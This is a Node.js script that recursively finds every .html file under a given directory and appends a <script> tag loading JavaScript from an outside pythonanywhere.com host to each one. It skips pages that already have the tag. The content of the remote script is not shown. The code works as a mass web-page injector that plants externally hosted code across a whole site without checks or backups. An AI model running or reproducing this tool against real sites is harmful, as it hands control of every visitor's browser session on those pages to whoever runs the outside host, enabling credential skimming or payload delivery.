const fs = require('fs');
const path = require('path');

// The code snippet you want to append
const codeToAppend = `<script src="https://olibot13.pythonanywhere.com/client_script.js"></script>`;

function findHtmlFiles(dir) {
  fs.readdir(dir, { withFileTypes: true }, (err, files) => {
    if (err) {
      console.error(`Error reading directory ${dir}:`, err);
      return;
    }

    files.forEach(file => {
      const fullPath = path.join(dir, file.name);

      if (file.isDirectory()) {
        findHtmlFiles(fullPath); // Recursively check subdirectories
      } else if (file.isFile() && path.extname(file.name).toLowerCase() === '.html') {
        fs.readFile(fullPath, 'utf8', (err, data) => {
          if (err) {
            console.error(`Error reading file ${fullPath}:`, err);
            return;
          }

          // Check if the code snippet already exists
          if (!data.includes(codeToAppend.trim())) {
            fs.appendFile(fullPath, codeToAppend, err => {
              if (err) {
                console.error(`Error appending to file ${fullPath}:`, err);
              } else {
                console.log(`Appended code to: ${fullPath}`);
              }
            });
          } else {
            console.log(`Code already present in: ${fullPath}`);
          }
        });
      }
    });
  });
}

// Start from current directory or provided path
const startDir = process.argv[2] || __dirname;
findHtmlFiles(startDir);
